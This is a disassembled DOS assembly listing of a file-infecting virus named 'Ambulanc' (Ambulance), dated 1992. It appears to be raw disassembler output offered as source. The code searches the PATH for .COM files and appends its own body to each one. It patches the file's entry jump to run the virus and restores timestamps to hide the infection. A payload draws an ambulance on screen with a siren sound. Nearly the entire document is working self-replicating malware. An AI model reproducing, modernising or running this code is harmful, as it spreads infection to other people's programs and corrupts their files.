
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        AMBULANC			         €€
;€€								         €€
;€€      Created:   13-Feb-92					         €€
;€€      Passes:    5	       Analysis Options on: none	         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_1e		equ	0Ch
data_2e		equ	49h
data_3e		equ	6Ch
psp_envirn_seg	equ	2Ch
data_20e	equ	0C80h

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

ambulanc	proc	far

start:
		jmp	loc_1
		db	0
data_7		dw	0			; Data table (indexed access)
		db	44 dup (0)
loc_1:
;*		call	sub_1			;*
		db	0E8h, 01h, 00h
		add	[bp-7Fh],bx
		out	dx,al			; port 0, DMA-1 bas&add ch 0
		add	ax,[bx+di]
		call	sub_2
		call	sub_2
		call	sub_4
		lea	bx,[si+419h]		; Load effective addr
		mov	di,100h
		mov	al,[bx]
		mov	[di],al
		mov	ax,[bx+1]
		mov	[di+1],ax
		jmp	di			;*Register jump

loc_ret_2:
		retn

ambulanc	endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2		proc	near
		call	sub_3
		mov	al,byte ptr data_19[si]
		or	al,al			; Zero ?
		jz	loc_ret_2		; Jump if zero
		lea	bx,[si+40Fh]		; Load effective addr
		inc	word ptr [bx]
		lea	dx,[si+428h]		; Load effective addr
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	data_12[si],ax
		mov	bx,data_12[si]
		mov	cx,3
		lea	dx,[si+414h]		; Load effective addr
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		mov	al,data_10[si]
		cmp	al,0E9h
		jne	loc_3			; Jump if not equal
		mov	dx,data_11[si]
		mov	bx,data_12[si]
		add	dx,3
		xor	cx,cx			; Zero register
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	bx,data_12[si]
		mov	cx,6
		lea	dx,[si+41Ch]		; Load effective addr
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		mov	ax,data_13[si]
		mov	bx,data_14[si]
		mov	cx,data_15[si]
		cmp	ax,word ptr ds:[100h][si]
		jne	loc_3			; Jump if not equal
		cmp	bx,word ptr ds:[102h][si]
		jne	loc_3			; Jump if not equal
		cmp	cx,data_7[si]
		je	loc_4			; Jump if equal
loc_3:
		mov	bx,data_12[si]
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		mov	ax,4202h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		sub	ax,3
		mov	data_9[si],ax
		mov	bx,data_12[si]
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get file date+time, bx=handle
						;   returns cx=time, dx=time
		push	cx
		push	dx
		mov	bx,data_12[si]
		mov	cx,319h
		lea	dx,[si+100h]		; Load effective addr
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	bx,data_12[si]
		mov	cx,3
		lea	dx,[si+414h]		; Load effective addr
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	bx,data_12[si]
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	bx,data_12[si]
		mov	cx,3
		lea	dx,[si+411h]		; Load effective addr
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		pop	dx
		pop	cx
		mov	bx,data_12[si]
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
loc_4:
		mov	bx,data_12[si]
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		retn
sub_2		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_3		proc	near
		mov	ax,ds:psp_envirn_seg
		mov	es,ax
		push	ds
		mov	ax,40h
		mov	ds,ax
		mov	bp,ds:data_3e
		pop	ds
		test	bp,3
		jz	loc_7			; Jump if zero
		xor	bx,bx			; Zero register
loc_5:
		mov	ax,es:[bx]
		cmp	ax,4150h
		jne	loc_6			; Jump if not equal
		cmp	word ptr es:[bx+2],4854h
		je	loc_8			; Jump if equal
loc_6:
		inc	bx
		or	ax,ax			; Zero ?
		jnz	loc_5			; Jump if not zero
loc_7:
		lea	di,[si+428h]		; Load effective addr
		jmp	short loc_13
loc_8:
		add	bx,5
loc_9:
		lea	di,[si+428h]		; Load effective addr
loc_10:
		mov	al,es:[bx]
		inc	bx
		or	al,al			; Zero ?
		jz	loc_12			; Jump if zero
		cmp	al,3Bh			; ';'
		je	loc_11			; Jump if equal
		mov	[di],al
		inc	di
		jmp	short loc_10
loc_11:
		cmp	byte ptr es:[bx],0
		je	loc_12			; Jump if equal
		shr	bp,1			; Shift w/zeros fill
		shr	bp,1			; Shift w/zeros fill
		test	bp,3
		jnz	loc_9			; Jump if not zero
loc_12:
		cmp	byte ptr [di-1],5Ch	; '\'
		je	loc_13			; Jump if equal
		mov	byte ptr [di],5Ch	; '\'
		inc	di
loc_13:
		push	ds
		pop	es
		mov	data_16[si],di
		mov	ax,2E2Ah
		stosw				; Store ax to es:[di]
		mov	ax,4F43h
		stosw				; Store ax to es:[di]
		mov	ax,4Dh
		stosw				; Store ax to es:[di]
		push	es
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		mov	ax,es
		mov	data_17[si],ax
		mov	data_18[si],bx
		pop	es
		lea	dx,[si+478h]		; Load effective addr
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		lea	dx,[si+428h]		; Load effective addr
		xor	cx,cx			; Zero register
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jnc	loc_14			; Jump if carry=0
		xor	ax,ax			; Zero register
		mov	data_19[si],ax
		jmp	short loc_17
loc_14:
		push	ds
		mov	ax,40h
		mov	ds,ax
		ror	bp,1			; Rotate
		xor	bp,ds:data_3e
		pop	ds
		test	bp,7
		jz	loc_15			; Jump if zero
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jnc	loc_14			; Jump if carry=0
loc_15:
		mov	di,data_16[si]
		lea	bx,[si+496h]		; Load effective addr
loc_16:
		mov	al,[bx]
		inc	bx
		stosb				; Store al to es:[di]
		or	al,al			; Zero ?
		jnz	loc_16			; Jump if not zero
loc_17:
		mov	bx,data_18[si]
		mov	ax,data_17[si]
		push	ds
		mov	ds,ax
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		pop	ds
		retn
sub_3		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_4		proc	near
		push	es
		mov	ax,data_8[si]
		and	ax,7
		cmp	ax,6
		jne	loc_18			; Jump if not equal
		mov	ax,40h
		mov	es,ax
		mov	ax,es:data_1e
		or	ax,ax			; Zero ?
		jnz	loc_18			; Jump if not zero
		inc	word ptr es:data_1e
		call	sub_5
loc_18:
		pop	es
		retn
sub_4		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_5		proc	near
		push	ds
		mov	di,0B800h
		mov	ax,40h
		mov	ds,ax
		mov	al,ds:data_2e
		cmp	al,7
		jne	loc_19			; Jump if not equal
		mov	di,0B000h
loc_19:
		mov	es,di
		pop	ds
		mov	bp,0FFF0h
loc_20:
		mov	dx,0
		mov	cx,10h

locloop_21:
		call	sub_8
		inc	dx
		loop	locloop_21		; Loop if cx > 0

		call	sub_7
		call	sub_9
		inc	bp
		cmp	bp,50h
		jne	loc_20			; Jump if not equal
		call	sub_6
		push	ds
		pop	es
		retn
sub_5		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_6		proc	near
		in	al,61h			; port 61h, 8255 port B, read
		and	al,0FCh
		out	61h,al			; port 61h, 8255 B - spkr, etc
						;  al = 0, disable parity
		retn
sub_6		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_7		proc	near
		mov	dx,7D0h
		test	bp,4
		jz	loc_22			; Jump if zero
		mov	dx,0BB8h
loc_22:
		in	al,61h			; port 61h, 8255 port B, read
		test	al,3
		jnz	loc_23			; Jump if not zero
		or	al,3
		out	61h,al			; port 61h, 8255 B - spkr, etc
		mov	al,0B6h
		out	43h,al			; port 43h, 8253 wrt timr mode
loc_23:
		mov	ax,dx
		out	42h,al			; port 42h, 8253 timer 2 spkr
		mov	al,ah
		out	42h,al			; port 42h, 8253 timer 2 spkr
		retn
sub_7		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_8		proc	near
		push	cx
		push	dx
		lea	bx,[si+3BFh]		; Load effective addr
		add	bx,dx
		add	dx,bp
		or	dx,dx			; Zero ?
		js	loc_26			; Jump if sign=1
		cmp	dx,50h
		jae	loc_26			; Jump if above or =
		mov	di,data_20e
		add	di,dx
		add	di,dx
		sub	dx,bp
		mov	cx,5

locloop_24:
		mov	ah,7
		mov	al,[bx]
		sub	al,7
		add	al,cl
		sub	al,dl
		cmp	cx,5
		jne	loc_25			; Jump if not equal
		mov	ah,0Fh
		test	bp,3
		jz	loc_25			; Jump if zero
		mov	al,20h			; ' '
loc_25:
		stosw				; Store ax to es:[di]
		add	bx,10h
		add	di,9Eh
		loop	locloop_24		; Loop if cx > 0

loc_26:
		pop	dx
		pop	cx
		retn
sub_8		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_9		proc	near
		push	ds
		mov	ax,40h
		mov	ds,ax
		mov	ax,ds:data_3e
loc_28:
		cmp	ax,ds:data_3e
		je	loc_28			; Jump if equal
		pop	ds
		retn
sub_9		endp

		and	ah,[bp+di]
		and	al,25h			; '%'
		db	 26h, 27h, 28h, 29h, 66h, 87h
		db	 3Bh, 2Dh, 2Eh, 2Fh, 30h, 31h
		db	 23h,0E0h,0E1h,0E2h,0E3h,0E4h
		db	0E5h,0E6h,0E7h,0E7h,0E9h,0EAh
		db	0EBh
		db	30h
data_8		dw	3231h			; Data table (indexed access)
		db	24h
data_9		dw	0E1E0h			; Data table (indexed access)
data_10		db	0E2h			; Data table (indexed access)
data_11		dw	0E8E3h			; Data table (indexed access)
data_12		dw	0EA2Ah			; Data table (indexed access)
		db	0E7h,0E8h,0E9h
data_13		dw	302Fh			; Data table (indexed access)
data_14		dw	326Dh			; Data table (indexed access)
data_15		dw	2533h			; Data table (indexed access)
data_16		dw	0E2E1h			; Data table (indexed access)
data_17		dw	0E4E3h			; Data table (indexed access)
data_18		dw	0E7E5h			; Data table (indexed access)
data_19		dw	0E8E7h			; Data table (indexed access)
		db	0E9h,0EAh,0EBh,0ECh,0EDh,0EEh
		db	0EFh, 26h,0E6h,0E7h, 29h, 59h
		db	 5Ah, 2Ch,0ECh,0EDh,0EEh,0EFh
		db	0F0h, 32h, 62h, 34h,0F4h, 0Ah
		db	 00h,0E9h, 2Fh, 00h,0CDh, 20h
		db	 00h, 05h, 00h,0CDh, 20h, 00h

seg_a		ends



		end	start
